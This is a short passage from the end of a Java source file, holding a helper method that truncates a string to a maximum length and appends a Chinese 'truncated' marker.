    private static String trunc(String s, int max)
    {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "\n...[已截断]";
    }
}
